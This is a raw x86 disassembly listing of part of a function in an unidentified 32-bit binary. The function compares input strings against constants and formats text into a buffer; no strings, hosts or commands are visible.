1314abdf:	a1 08 24 15 13       	mov    0x13152408,%eax
1314abe4:	85 c0                	test   %eax,%eax
1314abe6:	74 15                	je     0x1314abfd
1314abe8:	50                   	push   %eax
1314abe9:	8d 45 d4             	lea    -0x2c(%ebp),%eax
1314abec:	68 ec 1d 15 13       	push   $0x13151dec
1314abf1:	50                   	push   %eax
1314abf2:	ff 15 98 39 15 13    	call   *0x13153998
1314abf8:	83 c4 0c             	add    $0xc,%esp
1314abfb:	eb 11                	jmp    0x1314ac0e
1314abfd:	8d 45 d4             	lea    -0x2c(%ebp),%eax
1314ac00:	68 f0 1d 15 13       	push   $0x13151df0
1314ac05:	50                   	push   %eax
1314ac06:	ff 15 98 39 15 13    	call   *0x13153998
1314ac0c:	59                   	pop    %ecx
1314ac0d:	59                   	pop    %ecx
1314ac0e:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314ac14:	68 e4 1d 15 13       	push   $0x13151de4
1314ac19:	50                   	push   %eax
1314ac1a:	e8 0d 7b ff ff       	call   0x1314272c
1314ac1f:	59                   	pop    %ecx
1314ac20:	85 c0                	test   %eax,%eax
1314ac22:	59                   	pop    %ecx
1314ac23:	0f 85 43 01 00 00    	jne    0x1314ad6c
1314ac29:	8b 75 08             	mov    0x8(%ebp),%esi
1314ac2c:	8d 45 d4             	lea    -0x2c(%ebp),%eax
1314ac2f:	50                   	push   %eax
1314ac30:	56                   	push   %esi
1314ac31:	e8 c8 df ff ff       	call   0x13148bfe
1314ac36:	59                   	pop    %ecx
1314ac37:	50                   	push   %eax
1314ac38:	56                   	push   %esi
1314ac39:	e8 a5 df ff ff       	call   0x13148be3
1314ac3e:	59                   	pop    %ecx
1314ac3f:	50                   	push   %eax
1314ac40:	8d 45 e0             	lea    -0x20(%ebp),%eax
1314ac43:	50                   	push   %eax
1314ac44:	56                   	push   %esi
1314ac45:	e8 b4 df ff ff       	call   0x13148bfe
1314ac4a:	59                   	pop    %ecx
1314ac4b:	50                   	push   %eax
1314ac4c:	56                   	push   %esi
1314ac4d:	e8 91 df ff ff       	call   0x13148be3
1314ac52:	59                   	pop    %ecx
1314ac53:	50                   	push   %eax
1314ac54:	8d 85 b4 fa ff ff    	lea    -0x54c(%ebp),%eax
1314ac5a:	50                   	push   %eax
1314ac5b:	56                   	push   %esi
1314ac5c:	e8 9d df ff ff       	call   0x13148bfe
1314ac61:	59                   	pop    %ecx
1314ac62:	50                   	push   %eax
1314ac63:	56                   	push   %esi
1314ac64:	e8 7a df ff ff       	call   0x13148be3
1314ac69:	59                   	pop    %ecx
1314ac6a:	50                   	push   %eax
1314ac6b:	ff 35 40 0c 15 13    	pushl  0x13150c40
1314ac71:	56                   	push   %esi
1314ac72:	e8 87 df ff ff       	call   0x13148bfe
1314ac77:	59                   	pop    %ecx
1314ac78:	50                   	push   %eax
1314ac79:	56                   	push   %esi
1314ac7a:	e8 64 df ff ff       	call   0x13148be3
1314ac7f:	59                   	pop    %ecx
1314ac80:	50                   	push   %eax
1314ac81:	ff 35 38 0c 15 13    	pushl  0x13150c38
1314ac87:	56                   	push   %esi
1314ac88:	e8 71 df ff ff       	call   0x13148bfe
1314ac8d:	59                   	pop    %ecx
1314ac8e:	50                   	push   %eax
1314ac8f:	56                   	push   %esi
1314ac90:	e8 4e df ff ff       	call   0x13148be3
1314ac95:	59                   	pop    %ecx
1314ac96:	50                   	push   %eax
1314ac97:	ff 35 3c 0c 15 13    	pushl  0x13150c3c
1314ac9d:	56                   	push   %esi
1314ac9e:	e8 5b df ff ff       	call   0x13148bfe
1314aca3:	59                   	pop    %ecx
1314aca4:	50                   	push   %eax
1314aca5:	56                   	push   %esi
1314aca6:	e8 38 df ff ff       	call   0x13148be3
1314acab:	59                   	pop    %ecx
1314acac:	50                   	push   %eax
1314acad:	ff 35 c0 0b 15 13    	pushl  0x13150bc0
1314acb3:	56                   	push   %esi
1314acb4:	e8 45 df ff ff       	call   0x13148bfe
1314acb9:	59                   	pop    %ecx
1314acba:	50                   	push   %eax
1314acbb:	56                   	push   %esi
1314acbc:	e8 22 df ff ff       	call   0x13148be3
1314acc1:	59                   	pop    %ecx
1314acc2:	50                   	push   %eax
1314acc3:	ff 35 bc 0b 15 13    	pushl  0x13150bbc
1314acc9:	56                   	push   %esi
1314acca:	e8 2f df ff ff       	call   0x13148bfe
1314accf:	59                   	pop    %ecx
1314acd0:	50                   	push   %eax
1314acd1:	56                   	push   %esi
1314acd2:	e8 0c df ff ff       	call   0x13148be3
1314acd7:	59                   	pop    %ecx
1314acd8:	50                   	push   %eax
1314acd9:	ff 35 a0 f3 14 13    	pushl  0x1314f3a0
1314acdf:	56                   	push   %esi
1314ace0:	e8 19 df ff ff       	call   0x13148bfe
1314ace5:	59                   	pop    %ecx
1314ace6:	50                   	push   %eax
1314ace7:	56                   	push   %esi
1314ace8:	e8 f6 de ff ff       	call   0x13148be3
1314aced:	59                   	pop    %ecx
1314acee:	50                   	push   %eax
1314acef:	ff 35 a4 f3 14 13    	pushl  0x1314f3a4
1314acf5:	56                   	push   %esi
1314acf6:	e8 03 df ff ff       	call   0x13148bfe
1314acfb:	59                   	pop    %ecx
1314acfc:	50                   	push   %eax
1314acfd:	56                   	push   %esi
1314acfe:	e8 e0 de ff ff       	call   0x13148be3
1314ad03:	59                   	pop    %ecx
1314ad04:	50                   	push   %eax
1314ad05:	ff 35 30 fc 14 13    	pushl  0x1314fc30
1314ad0b:	56                   	push   %esi
1314ad0c:	e8 ed de ff ff       	call   0x13148bfe
1314ad11:	59                   	pop    %ecx
1314ad12:	50                   	push   %eax
1314ad13:	56                   	push   %esi
1314ad14:	e8 ca de ff ff       	call   0x13148be3
1314ad19:	59                   	pop    %ecx
1314ad1a:	50                   	push   %eax
1314ad1b:	ff 35 38 fc 14 13    	pushl  0x1314fc38
1314ad21:	56                   	push   %esi
1314ad22:	e8 d7 de ff ff       	call   0x13148bfe
1314ad27:	59                   	pop    %ecx
1314ad28:	50                   	push   %eax
1314ad29:	56                   	push   %esi
1314ad2a:	e8 b4 de ff ff       	call   0x13148be3
1314ad2f:	59                   	pop    %ecx
1314ad30:	50                   	push   %eax
1314ad31:	ff 35 34 fc 14 13    	pushl  0x1314fc34
1314ad37:	56                   	push   %esi
1314ad38:	e8 c1 de ff ff       	call   0x13148bfe
1314ad3d:	59                   	pop    %ecx
1314ad3e:	50                   	push   %eax
1314ad3f:	56                   	push   %esi
1314ad40:	e8 9e de ff ff       	call   0x13148be3
1314ad45:	59                   	pop    %ecx
1314ad46:	50                   	push   %eax
1314ad47:	56                   	push   %esi
1314ad48:	e8 cc de ff ff       	call   0x13148c19
1314ad4d:	59                   	pop    %ecx
1314ad4e:	50                   	push   %eax
1314ad4f:	8d 83 64 76 17 13    	lea    0x13177664(%ebx),%eax
1314ad55:	68 f4 1c 15 13       	push   $0x13151cf4
1314ad5a:	50                   	push   %eax
1314ad5b:	ff 15 98 39 15 13    	call   *0x13153998
1314ad61:	81 c4 a8 00 00 00    	add    $0xa8,%esp
1314ad67:	e9 67 18 00 00       	jmp    0x1314c5d3
1314ad6c:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314ad72:	68 ec 1c 15 13       	push   $0x13151cec
1314ad77:	50                   	push   %eax
1314ad78:	e8 af 79 ff ff       	call   0x1314272c
1314ad7d:	59                   	pop    %ecx
1314ad7e:	85 c0                	test   %eax,%eax
1314ad80:	59                   	pop    %ecx
1314ad81:	0f 85 b0 03 00 00    	jne    0x1314b137
1314ad87:	8b 7d 08             	mov    0x8(%ebp),%edi
1314ad8a:	8d b3 64 76 17 13    	lea    0x13177664(%ebx),%esi
1314ad90:	57                   	push   %edi
1314ad91:	e8 83 de ff ff       	call   0x13148c19
1314ad96:	50                   	push   %eax
1314ad97:	68 e0 1c 15 13       	push   $0x13151ce0
1314ad9c:	56                   	push   %esi
1314ad9d:	ff 15 98 39 15 13    	call   *0x13153998
1314ada3:	83 25 8c a5 17 13 00 	andl   $0x0,0x1317a58c
1314adaa:	83 c4 10             	add    $0x10,%esp
1314adad:	e8 b3 9d ff ff       	call   0x13144b65
1314adb2:	85 c0                	test   %eax,%eax
1314adb4:	74 3c                	je     0x1314adf2
1314adb6:	e8 a4 9d ff ff       	call   0x13144b5f
1314adbb:	50                   	push   %eax
1314adbc:	57                   	push   %edi
1314adbd:	e8 57 de ff ff       	call   0x13148c19
1314adc2:	59                   	pop    %ecx
1314adc3:	50                   	push   %eax
1314adc4:	57                   	push   %edi
1314adc5:	e8 19 de ff ff       	call   0x13148be3
1314adca:	59                   	pop    %ecx
1314adcb:	50                   	push   %eax
1314adcc:	57                   	push   %edi
1314adcd:	e8 47 de ff ff       	call   0x13148c19
1314add2:	59                   	pop    %ecx
1314add3:	50                   	push   %eax
1314add4:	68 c4 1c 15 13       	push   $0x13151cc4
1314add9:	56                   	push   %esi
1314adda:	e8 1e 79 ff ff       	call   0x131426fd
1314addf:	59                   	pop    %ecx
1314ade0:	03 c6                	add    %esi,%eax
1314ade2:	50                   	push   %eax
1314ade3:	ff 15 98 39 15 13    	call   *0x13153998
1314ade9:	83 c4 18             	add    $0x18,%esp
1314adec:	ff 05 8c a5 17 13    	incl   0x1317a58c
1314adf2:	e8 98 7d ff ff       	call   0x13142b8f
1314adf7:	85 c0                	test   %eax,%eax
1314adf9:	74 3c                	je     0x1314ae37
1314adfb:	e8 83 7d ff ff       	call   0x13142b83
1314ae00:	50                   	push   %eax
1314ae01:	57                   	push   %edi
1314ae02:	e8 12 de ff ff       	call   0x13148c19
1314ae07:	59                   	pop    %ecx
1314ae08:	50                   	push   %eax
1314ae09:	57                   	push   %edi
1314ae0a:	e8 d4 dd ff ff       	call   0x13148be3
1314ae0f:	59                   	pop    %ecx
1314ae10:	50                   	push   %eax
1314ae11:	57                   	push   %edi
1314ae12:	e8 02 de ff ff       	call   0x13148c19
1314ae17:	59                   	pop    %ecx
1314ae18:	50                   	push   %eax
1314ae19:	68 ac 1c 15 13       	push   $0x13151cac
1314ae1e:	56                   	push   %esi
1314ae1f:	e8 d9 78 ff ff       	call   0x131426fd
1314ae24:	59                   	pop    %ecx
1314ae25:	03 c6                	add    %esi,%eax
1314ae27:	50                   	push   %eax
1314ae28:	ff 15 98 39 15 13    	call   *0x13153998
1314ae2e:	83 c4 18             	add    $0x18,%esp
1314ae31:	ff 05 8c a5 17 13    	incl   0x1317a58c
1314ae37:	e8 75 70 ff ff       	call   0x13141eb1
1314ae3c:	85 c0                	test   %eax,%eax
1314ae3e:	74 3c                	je     0x1314ae7c
1314ae40:	e8 72 70 ff ff       	call   0x13141eb7
1314ae45:	50                   	push   %eax
1314ae46:	57                   	push   %edi
1314ae47:	e8 cd dd ff ff       	call   0x13148c19
1314ae4c:	59                   	pop    %ecx
1314ae4d:	50                   	push   %eax
1314ae4e:	57                   	push   %edi
1314ae4f:	e8 8f dd ff ff       	call   0x13148be3
1314ae54:	59                   	pop    %ecx
1314ae55:	50                   	push   %eax
1314ae56:	57                   	push   %edi
1314ae57:	e8 bd dd ff ff       	call   0x13148c19
1314ae5c:	59                   	pop    %ecx
1314ae5d:	50                   	push   %eax
1314ae5e:	68 94 1c 15 13       	push   $0x13151c94
1314ae63:	56                   	push   %esi
1314ae64:	e8 94 78 ff ff       	call   0x131426fd
1314ae69:	59                   	pop    %ecx
1314ae6a:	03 c6                	add    %esi,%eax
1314ae6c:	50                   	push   %eax
1314ae6d:	ff 15 98 39 15 13    	call   *0x13153998
1314ae73:	83 c4 18             	add    $0x18,%esp
1314ae76:	ff 05 8c a5 17 13    	incl   0x1317a58c
1314ae7c:	e8 95 77 ff ff       	call   0x13142616
1314ae81:	85 c0                	test   %eax,%eax
1314ae83:	74 3c                	je     0x1314aec1
1314ae85:	e8 92 77 ff ff       	call   0x1314261c
1314ae8a:	50                   	push   %eax
1314ae8b:	57                   	push   %edi
1314ae8c:	e8 88 dd ff ff       	call   0x13148c19
1314ae91:	59                   	pop    %ecx
1314ae92:	50                   	push   %eax
1314ae93:	57                   	push   %edi
1314ae94:	e8 4a dd ff ff       	call   0x13148be3
1314ae99:	59                   	pop    %ecx
1314ae9a:	50                   	push   %eax
1314ae9b:	57                   	push   %edi
1314ae9c:	e8 78 dd ff ff       	call   0x13148c19
1314aea1:	59                   	pop    %ecx
1314aea2:	50                   	push   %eax
1314aea3:	68 7c 1c 15 13       	push   $0x13151c7c
1314aea8:	56                   	push   %esi
1314aea9:	e8 4f 78 ff ff       	call   0x131426fd
1314aeae:	59                   	pop    %ecx
1314aeaf:	03 c6                	add    %esi,%eax
1314aeb1:	50                   	push   %eax
1314aeb2:	ff 15 98 39 15 13    	call   *0x13153998
1314aeb8:	83 c4 18             	add    $0x18,%esp
1314aebb:	ff 05 8c a5 17 13    	incl   0x1317a58c
1314aec1:	e8 40 cf ff ff       	call   0x13147e06
1314aec6:	85 c0                	test   %eax,%eax
1314aec8:	74 3c                	je     0x1314af06
1314aeca:	e8 3d cf ff ff       	call   0x13147e0c
1314aecf:	50                   	push   %eax
1314aed0:	57                   	push   %edi
1314aed1:	e8 43 dd ff ff       	call   0x13148c19
1314aed6:	59                   	pop    %ecx
1314aed7:	50                   	push   %eax
1314aed8:	57                   	push   %edi
1314aed9:	e8 05 dd ff ff       	call   0x13148be3
1314aede:	59                   	pop    %ecx
1314aedf:	50                   	push   %eax
1314aee0:	57                   	push   %edi
1314aee1:	e8 33 dd ff ff       	call   0x13148c19
1314aee6:	59                   	pop    %ecx
1314aee7:	50                   	push   %eax
1314aee8:	68 68 1c 15 13       	push   $0x13151c68
1314aeed:	56                   	push   %esi
1314aeee:	e8 0a 78 ff ff       	call   0x131426fd
1314aef3:	59                   	pop    %ecx
1314aef4:	03 c6                	add    %esi,%eax
1314aef6:	50                   	push   %eax
1314aef7:	ff 15 98 39 15 13    	call   *0x13153998
1314aefd:	83 c4 18             	add    $0x18,%esp
1314af00:	ff 05 8c a5 17 13    	incl   0x1317a58c
1314af06:	e8 7c d4 ff ff       	call   0x13148387
1314af0b:	85 c0                	test   %eax,%eax
1314af0d:	74 3c                	je     0x1314af4b
1314af0f:	e8 79 d4 ff ff       	call   0x1314838d
1314af14:	50                   	push   %eax
1314af15:	57                   	push   %edi
1314af16:	e8 fe dc ff ff       	call   0x13148c19
1314af1b:	59                   	pop    %ecx
1314af1c:	50                   	push   %eax
1314af1d:	57                   	push   %edi
1314af1e:	e8 c0 dc ff ff       	call   0x13148be3
1314af23:	59                   	pop    %ecx
1314af24:	50                   	push   %eax
1314af25:	57                   	push   %edi
1314af26:	e8 ee dc ff ff       	call   0x13148c19
1314af2b:	59                   	pop    %ecx
1314af2c:	50                   	push   %eax
1314af2d:	68 54 1c 15 13       	push   $0x13151c54
1314af32:	56                   	push   %esi
1314af33:	e8 c5 77 ff ff       	call   0x131426fd
1314af38:	59                   	pop    %ecx
1314af39:	03 c6                	add    %esi,%eax
1314af3b:	50                   	push   %eax
1314af3c:	ff 15 98 39 15 13    	call   *0x13153998
1314af42:	83 c4 18             	add    $0x18,%esp
1314af45:	ff 05 8c a5 17 13    	incl   0x1317a58c
1314af4b:	e8 21 95 ff ff       	call   0x13144471
1314af50:	85 c0                	test   %eax,%eax
1314af52:	74 3c                	je     0x1314af90
1314af54:	e8 1e 95 ff ff       	call   0x13144477
1314af59:	50                   	push   %eax
1314af5a:	57                   	push   %edi
1314af5b:	e8 b9 dc ff ff       	call   0x13148c19
1314af60:	59                   	pop    %ecx
1314af61:	50                   	push   %eax
1314af62:	57                   	push   %edi
1314af63:	e8 7b dc ff ff       	call   0x13148be3
1314af68:	59                   	pop    %ecx
1314af69:	50                   	push   %eax
1314af6a:	57                   	push   %edi
1314af6b:	e8 a9 dc ff ff       	call   0x13148c19
1314af70:	59                   	pop    %ecx
1314af71:	50                   	push   %eax
1314af72:	68 40 1c 15 13       	push   $0x13151c40
1314af77:	56                   	push   %esi
1314af78:	e8 80 77 ff ff       	call   0x131426fd
1314af7d:	59                   	pop    %ecx
1314af7e:	03 c6                	add    %esi,%eax
1314af80:	50                   	push   %eax
1314af81:	ff 15 98 39 15 13    	call   *0x13153998
1314af87:	83 c4 18             	add    $0x18,%esp
1314af8a:	ff 05 8c a5 17 13    	incl   0x1317a58c
1314af90:	e8 c7 97 ff ff       	call   0x1314475c
1314af95:	85 c0                	test   %eax,%eax
1314af97:	74 42                	je     0x1314afdb
1314af99:	e8 c4 97 ff ff       	call   0x13144762
1314af9e:	50                   	push   %eax
1314af9f:	e8 c4 97 ff ff       	call   0x13144768
1314afa4:	50                   	push   %eax
1314afa5:	57                   	push   %edi
1314afa6:	e8 6e dc ff ff       	call   0x13148c19
1314afab:	59                   	pop    %ecx
1314afac:	50                   	push   %eax
1314afad:	57                   	push   %edi
1314afae:	e8 30 dc ff ff       	call   0x13148be3
1314afb3:	59                   	pop    %ecx
1314afb4:	50                   	push   %eax
1314afb5:	57                   	push   %edi
1314afb6:	e8 5e dc ff ff       	call   0x13148c19
1314afbb:	59                   	pop    %ecx
1314afbc:	50                   	push   %eax
1314afbd:	68 20 1c 15 13       	push   $0x13151c20
1314afc2:	56                   	push   %esi
1314afc3:	e8 35 77 ff ff       	call   0x131426fd
1314afc8:	59                   	pop    %ecx
1314afc9:	03 c6                	add    %esi,%eax
1314afcb:	50                   	push   %eax
1314afcc:	ff 15 98 39 15 13    	call   *0x13153998
1314afd2:	83 c4 1c             	add    $0x1c,%esp
1314afd5:	ff 05 8c a5 17 13    	incl   0x1317a58c
1314afdb:	e8 e9 d7 ff ff       	call   0x131487c9
1314afe0:	85 c0                	test   %eax,%eax
1314afe2:	74 42                	je     0x1314b026
1314afe4:	e8 da d7 ff ff       	call   0x131487c3
1314afe9:	50                   	push   %eax
1314afea:	e8 ce d7 ff ff       	call   0x131487bd
1314afef:	50                   	push   %eax
1314aff0:	57                   	push   %edi
1314aff1:	e8 23 dc ff ff       	call   0x13148c19
1314aff6:	59                   	pop    %ecx
1314aff7:	50                   	push   %eax
1314aff8:	57                   	push   %edi
1314aff9:	e8 e5 db ff ff       	call   0x13148be3
1314affe:	59                   	pop    %ecx
1314afff:	50                   	push   %eax
1314b000:	57                   	push   %edi
1314b001:	e8 13 dc ff ff       	call   0x13148c19
1314b006:	59                   	pop    %ecx
1314b007:	50                   	push   %eax
1314b008:	68 04 1c 15 13       	push   $0x13151c04
1314b00d:	56                   	push   %esi
1314b00e:	e8 ea 76 ff ff       	call   0x131426fd
1314b013:	59                   	pop    %ecx
1314b014:	03 c6                	add    %esi,%eax
1314b016:	50                   	push   %eax
1314b017:	ff 15 98 39 15 13    	call   *0x13153998
1314b01d:	83 c4 1c             	add    $0x1c,%esp
1314b020:	ff 05 8c a5 17 13    	incl   0x1317a58c
1314b026:	e8 b5 da ff ff       	call   0x13148ae0
1314b02b:	85 c0                	test   %eax,%eax
1314b02d:	74 3c                	je     0x1314b06b
1314b02f:	e8 a6 da ff ff       	call   0x13148ada
1314b034:	50                   	push   %eax
1314b035:	57                   	push   %edi
1314b036:	e8 de db ff ff       	call   0x13148c19
1314b03b:	59                   	pop    %ecx
1314b03c:	50                   	push   %eax
1314b03d:	57                   	push   %edi
1314b03e:	e8 a0 db ff ff       	call   0x13148be3
1314b043:	59                   	pop    %ecx
1314b044:	50                   	push   %eax
1314b045:	57                   	push   %edi
1314b046:	e8 ce db ff ff       	call   0x13148c19
1314b04b:	59                   	pop    %ecx
1314b04c:	50                   	push   %eax
1314b04d:	68 e8 1b 15 13       	push   $0x13151be8
1314b052:	56                   	push   %esi
1314b053:	e8 a5 76 ff ff       	call   0x131426fd
1314b058:	59                   	pop    %ecx
1314b059:	03 c6                	add    %esi,%eax
1314b05b:	50                   	push   %eax
1314b05c:	ff 15 98 39 15 13    	call   *0x13153998
1314b062:	83 c4 18             	add    $0x18,%esp
1314b065:	ff 05 8c a5 17 13    	incl   0x1317a58c
1314b06b:	80 3d 88 a5 17 13 00 	cmpb   $0x0,0x1317a588
1314b072:	74 36                	je     0x1314b0aa
1314b074:	57                   	push   %edi
1314b075:	e8 9f db ff ff       	call   0x13148c19
1314b07a:	59                   	pop    %ecx
1314b07b:	50                   	push   %eax
1314b07c:	57                   	push   %edi
1314b07d:	e8 61 db ff ff       	call   0x13148be3
1314b082:	59                   	pop    %ecx
1314b083:	50                   	push   %eax
1314b084:	57                   	push   %edi
1314b085:	e8 8f db ff ff       	call   0x13148c19
1314b08a:	59                   	pop    %ecx
1314b08b:	50                   	push   %eax
1314b08c:	68 d4 1b 15 13       	push   $0x13151bd4
1314b091:	56                   	push   %esi
1314b092:	e8 66 76 ff ff       	call   0x131426fd
1314b097:	59                   	pop    %ecx
1314b098:	03 c6                	add    %esi,%eax
1314b09a:	50                   	push   %eax
1314b09b:	ff 15 98 39 15 13    	call   *0x13153998
1314b0a1:	83 c4 14             	add    $0x14,%esp
1314b0a4:	ff 05 8c a5 17 13    	incl   0x1317a58c
1314b0aa:	e8 e5 68 ff ff       	call   0x13141994
1314b0af:	85 c0                	test   %eax,%eax
1314b0b1:	74 44                	je     0x1314b0f7
1314b0b3:	57                   	push   %edi
1314b0b4:	e8 60 db ff ff       	call   0x13148c19
1314b0b9:	59                   	pop    %ecx
1314b0ba:	50                   	push   %eax
1314b0bb:	e8 da 68 ff ff       	call   0x1314199a
1314b0c0:	50                   	push   %eax
1314b0c1:	57                   	push   %edi
1314b0c2:	e8 52 db ff ff       	call   0x13148c19
1314b0c7:	59                   	pop    %ecx
1314b0c8:	50                   	push   %eax
1314b0c9:	57                   	push   %edi
1314b0ca:	e8 14 db ff ff       	call   0x13148be3
1314b0cf:	59                   	pop    %ecx
1314b0d0:	50                   	push   %eax
1314b0d1:	57                   	push   %edi
1314b0d2:	e8 42 db ff ff       	call   0x13148c19
1314b0d7:	59                   	pop    %ecx
1314b0d8:	50                   	push   %eax
1314b0d9:	68 bc 1b 15 13       	push   $0x13151bbc
1314b0de:	56                   	push   %esi
1314b0df:	e8 19 76 ff ff       	call   0x131426fd
1314b0e4:	59                   	pop    %ecx
1314b0e5:	03 c6                	add    %esi,%eax
1314b0e7:	50                   	push   %eax
1314b0e8:	ff 15 98 39 15 13    	call   *0x13153998
1314b0ee:	83 c4 1c             	add    $0x1c,%esp
1314b0f1:	ff 05 8c a5 17 13    	incl   0x1317a58c
1314b0f7:	a1 8c a5 17 13       	mov    0x1317a58c,%eax
1314b0fc:	85 c0                	test   %eax,%eax
1314b0fe:	75 1b                	jne    0x1314b11b
1314b100:	57                   	push   %edi
1314b101:	e8 49 db ff ff       	call   0x13148c4f
1314b106:	59                   	pop    %ecx
1314b107:	50                   	push   %eax
1314b108:	68 a8 1b 15 13       	push   $0x13151ba8
1314b10d:	56                   	push   %esi
1314b10e:	e8 ea 75 ff ff       	call   0x131426fd
1314b113:	59                   	pop    %ecx
1314b114:	03 c6                	add    %esi,%eax
1314b116:	e9 e4 17 00 00       	jmp    0x1314c8ff
1314b11b:	50                   	push   %eax
1314b11c:	57                   	push   %edi
1314b11d:	e8 2d db ff ff       	call   0x13148c4f
1314b122:	59                   	pop    %ecx
1314b123:	50                   	push   %eax
1314b124:	68 98 1b 15 13       	push   $0x13151b98
1314b129:	56                   	push   %esi
1314b12a:	e8 ce 75 ff ff       	call   0x131426fd
1314b12f:	59                   	pop    %ecx
1314b130:	03 c6                	add    %esi,%eax
1314b132:	e9 82 f1 ff ff       	jmp    0x1314a2b9
1314b137:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314b13d:	68 94 1b 15 13       	push   $0x13151b94
1314b142:	50                   	push   %eax
1314b143:	e8 e4 75 ff ff       	call   0x1314272c
1314b148:	59                   	pop    %ecx
1314b149:	85 c0                	test   %eax,%eax
1314b14b:	59                   	pop    %ecx
1314b14c:	0f 85 b9 00 00 00    	jne    0x1314b20b
1314b152:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314b158:	6a 01                	push   $0x1
1314b15a:	50                   	push   %eax
1314b15b:	57                   	push   %edi
1314b15c:	e8 11 a4 ff ff       	call   0x13145572
1314b161:	83 c4 0c             	add    $0xc,%esp
1314b164:	85 c0                	test   %eax,%eax
1314b166:	0f 84 95 00 00 00    	je     0x1314b201
1314b16c:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314b172:	6a 02                	push   $0x2
1314b174:	50                   	push   %eax
1314b175:	57                   	push   %edi
1314b176:	e8 f7 a3 ff ff       	call   0x13145572
1314b17b:	83 c4 0c             	add    $0xc,%esp
1314b17e:	85 c0                	test   %eax,%eax
1314b180:	74 7f                	je     0x1314b201
1314b182:	e8 08 7a ff ff       	call   0x13142b8f
1314b187:	85 c0                	test   %eax,%eax
1314b189:	74 16                	je     0x1314b1a1
1314b18b:	e8 f9 79 ff ff       	call   0x13142b89
1314b190:	50                   	push   %eax
1314b191:	e8 ed 79 ff ff       	call   0x13142b83
1314b196:	50                   	push   %eax
1314b197:	68 6c 1b 15 13       	push   $0x13151b6c
1314b19c:	e9 12 f1 ff ff       	jmp    0x1314a2b3
1314b1a1:	8d 85 50 fc ff ff    	lea    -0x3b0(%ebp),%eax
1314b1a7:	6a 03                	push   $0x3
1314b1a9:	50                   	push   %eax
1314b1aa:	57                   	push   %edi
1314b1ab:	e8 c2 a3 ff ff       	call   0x13145572
1314b1b0:	83 c4 0c             	add    $0xc,%esp
1314b1b3:	85 c0                	test   %eax,%eax
1314b1b5:	74 1d                	je     0x1314b1d4
1314b1b7:	8d 85 50 fc ff ff    	lea    -0x3b0(%ebp),%eax
1314b1bd:	68 64 1b 15 13       	push   $0x13151b64
1314b1c2:	50                   	push   %eax
1314b1c3:	e8 64 75 ff ff       	call   0x1314272c
1314b1c8:	59                   	pop    %ecx
1314b1c9:	85 c0                	test   %eax,%eax
1314b1cb:	59                   	pop    %ecx
1314b1cc:	75 06                	jne    0x1314b1d4
1314b1ce:	ff 75 08             	pushl  0x8(%ebp)
1314b1d1:	50                   	push   %eax
1314b1d2:	eb 05                	jmp    0x1314b1d9
1314b1d4:	ff 75 08             	pushl  0x8(%ebp)
1314b1d7:	6a 01                	push   $0x1
1314b1d9:	8d 85 d0 fb ff ff    	lea    -0x430(%ebp),%eax
1314b1df:	56                   	push   %esi
1314b1e0:	50                   	push   %eax
1314b1e1:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314b1e7:	50                   	push   %eax
1314b1e8:	e8 a8 79 ff ff       	call   0x13142b95
1314b1ed:	83 c4 14             	add    $0x14,%esp
1314b1f0:	ff 35 18 d3 14 13    	pushl  0x1314d318
1314b1f6:	ff 15 fc 36 15 13    	call   *0x131536fc
1314b1fc:	e9 2b 17 00 00       	jmp    0x1314c92c
1314b201:	68 40 1b 15 13       	push   $0x13151b40
1314b206:	e9 d1 16 00 00       	jmp    0x1314c8dc
1314b20b:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314b211:	68 38 1b 15 13       	push   $0x13151b38
1314b216:	50                   	push   %eax
1314b217:	e8 10 75 ff ff       	call   0x1314272c
1314b21c:	59                   	pop    %ecx
1314b21d:	85 c0                	test   %eax,%eax
1314b21f:	59                   	pop    %ecx
1314b220:	75 26                	jne    0x1314b248
1314b222:	e8 68 79 ff ff       	call   0x13142b8f
1314b227:	85 c0                	test   %eax,%eax
1314b229:	74 13                	je     0x1314b23e
1314b22b:	6a 01                	push   $0x1
1314b22d:	e8 ec 79 ff ff       	call   0x13142c1e
1314b232:	c7 04 24 20 1b 15 13 	movl   $0x13151b20,(%esp)
1314b239:	e9 9e 16 00 00       	jmp    0x1314c8dc
1314b23e:	68 08 1b 15 13       	push   $0x13151b08
1314b243:	e9 94 16 00 00       	jmp    0x1314c8dc
1314b248:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314b24e:	68 04 1b 15 13       	push   $0x13151b04
1314b253:	50                   	push   %eax
1314b254:	e8 d3 74 ff ff       	call   0x1314272c
1314b259:	59                   	pop    %ecx
1314b25a:	85 c0                	test   %eax,%eax
1314b25c:	59                   	pop    %ecx
1314b25d:	75 37                	jne    0x1314b296
1314b25f:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314b265:	6a 01                	push   $0x1
1314b267:	50                   	push   %eax
1314b268:	57                   	push   %edi
1314b269:	e8 04 a3 ff ff       	call   0x13145572
1314b26e:	83 c4 0c             	add    $0xc,%esp
1314b271:	85 c0                	test   %eax,%eax
1314b273:	75 0a                	jne    0x1314b27f
1314b275:	68 ec 1a 15 13       	push   $0x13151aec
1314b27a:	e9 5d 16 00 00       	jmp    0x1314c8dc
1314b27f:	68 d8 0d 15 13       	push   $0x13150dd8
1314b284:	57                   	push   %edi
1314b285:	e8 b3 73 ff ff       	call   0x1314263d
1314b28a:	40                   	inc    %eax
1314b28b:	50                   	push   %eax
1314b28c:	e8 b5 da ff ff       	call   0x13148d46
1314b291:	e9 17 08 00 00       	jmp    0x1314baad
1314b296:	8d 85 d1 fa ff ff    	lea    -0x52f(%ebp),%eax
1314b29c:	68 e8 1a 15 13       	push   $0x13151ae8
1314b2a1:	50                   	push   %eax
1314b2a2:	e8 85 74 ff ff       	call   0x1314272c
1314b2a7:	59                   	pop    %ecx
1314b2a8:	85 c0                	test   %eax,%eax
1314b2aa:	59                   	pop    %ecx
1314b2ab:	75 61                	jne    0x1314b30e
1314b2ad:	8d 85 50 fb ff ff    	lea    -0x4b0(%ebp),%eax
1314b2b3:	6a 01                	push   $0x1
1314b2b5:	50                   	push   %eax
1314b2b6:	57                   	push   %edi
1314b2b7:	e8 b6 a2 ff ff       	call   0x13145572
1314b2bc:	83 c4 0c             	add    $0xc,%esp
1314b2bf:	85 c0                	test   %eax,%eax
